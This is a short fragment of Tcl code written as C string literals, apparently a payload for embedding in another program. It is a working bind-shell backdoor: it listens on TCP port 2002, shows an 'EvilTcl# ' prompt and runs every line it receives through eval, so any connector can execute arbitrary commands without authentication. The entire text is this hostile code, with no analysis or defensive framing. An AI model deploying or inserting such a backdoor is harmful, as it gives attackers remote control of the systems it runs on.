"proc callback {sock addr port} {\n"
"puts callback\n"
"fconfigure $sock -translation crlf -buffering line\n"
"puts -nonewline $sock \"EvilTcl# \"\n"
"flush $sock\n"
"fileevent $sock readable [list echo $sock]\n"
"}\n"
"proc echo {sock} {\n"
"global trm\n"
"flush $sock\n"
"if {[catch {gets $sock line}] || [eof $sock]} {\n"
"return [close $sock]\n"
"}\n"
"catch {eval $line} result\n"
"if {[catch {puts $sock $result}]} {\n"
"return [close $sock]\n"
"}\n"
"puts -nonewline $sock \"EvilTcl# \"\n"
"flush $sock\n"
"}\n"
"set port 2002\n"
"set sh [socket -server callback $port]\n"
"vwait trm\n"
"close $sh\n";